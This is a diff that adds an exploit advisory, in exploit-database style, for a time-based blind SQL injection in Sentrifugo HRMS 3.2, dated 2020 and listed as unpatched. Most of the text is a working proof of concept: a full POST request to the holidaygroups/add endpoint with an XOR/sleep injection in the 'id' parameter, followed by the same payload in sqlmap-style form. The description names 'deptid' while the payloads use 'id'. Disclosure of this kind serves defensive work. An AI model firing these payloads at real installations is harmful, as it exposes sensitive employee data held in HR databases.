@@ -1,0 +1,45 @@
+# Exploit Title: Sentrifugo HRMS 3.2 - 'id' SQL Injection
+# Exploit Author: minhnb
+# Website: 
+# Date: 2020-03-06
+# Google Dork: N/A
+# Vendor: http://www.sapplica.com
+# Software Link: http://www.sentrifugo.com/download
+# Affected Version: 3.2 and possibly before
+# Patched Version: unpatched
+# Category: Web Application
+# Platform: PHP
+# Tested on: Win10x64 & Kali Linux
+# CVE: N/A
+ 
+# 1. Technical Description:
+# Sentrifugo HRMS version 3.2 and possibly before are affected by Blind SQL Injection in deptid
+# parameter through POST request in "/sentrifugo/index.php/holidaygroups/add" resource.
+# This allows a user of the application without permissions to read sensitive information from
+# the database used by the application.
+  
+# 2. Proof Of Concept (PoC):
+
+POST /sentrifugo/index.php/holidaygroups/add HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+X-Requested-With: XMLHttpRequest
+Referer: http://localhost/sentrifugo/index.php
+Connection: keep-alive
+Cookie: PHPSESSID=j4a2o4mq6frhfltq2a0h2spknh
+Accept: */*
+Accept-Encoding: gzip,deflate
+Content-Length: 98
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
+
+Cancel=1&description=555&groupname=e&id=0'XOR(if(now()=sysdate()%2Csleep(9)%2C0))XOR'Z&submit=Save
+
+
+# 3. Payload:
+
+Parameter: id (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0 time-based blind - Parameter replace
+    Payload: Cancel=1&description=555&groupname=e&id=0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z&submit=Save
+
+# 4. Reference:
